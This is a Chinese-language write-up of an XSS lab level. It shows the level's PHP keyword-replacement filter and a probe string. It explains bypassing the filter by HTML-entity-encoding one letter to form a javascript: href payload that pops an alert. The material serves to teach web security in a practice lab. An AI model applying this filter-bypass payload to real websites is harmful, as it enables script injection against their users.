# Level-8 （href 注入 + HTML 实体编码绕关键词）

## 万能探针

```
<SCRscriptIPT>'"()Oonnjavascript
```

## 查看分析源码

```php
$str = strtolower($_GET["keyword"]);
$str2 = str_replace("script","scr_ipt",$str);    // 小写 script
$str3 = str_replace("on","o_n",$str2);           // 小写 on
$str4 = str_replace("src","sr_c",$str3);         // 小写 src
$str5 = str_replace("data","da_ta",$str4);       // 小写 data
$str6 = str_replace("href","hr_ef",$str5);       // 小写 href
$str7 = str_replace('"','&quot',$str6);          // 双引号

echo '<input value="'.htmlspecialchars($str).'">';  // 安全出口
echo '<a href="'.$str7.'">友情链接</a>';              // ★ 注入点
```

两个输出点，input value 被 htmlspecialchars 护住了，注入点在 `<a href="...">` 里

和前面几关不一样——不用破标签，直接在 href 里用 `javascript:` 伪协议

但 `script` 被替换成 `scr_ipt` → `javascript:` 用不了

## HTML 实体编码绕过

`script` 不出现但在浏览器里还是 `script`——把某个字符 HTML 实体编码

`s` → `&#115;`

```
java&#115;cript:alert(1)
```

过滤器看 `java&#115;cript`：没有 `script`，没有 `on`，没有 `src/data/href` → 全过

浏览器渲染时 `&#115;` 解码回 `s` → `javascript:alert(1)` ✅

## 构造 payload

```
java&#115;cript:alert(1)
```

拼进去：

```html
<a href="java&#115;cript:alert(1)">友情链接</a>
```

点链接弹窗。关键点：**HTML 实体编码在属性值里浏览器自动解码，但 PHP 字符串替换不认**。
![](99_Attachments/图片/level8/file-20260617193718212.png)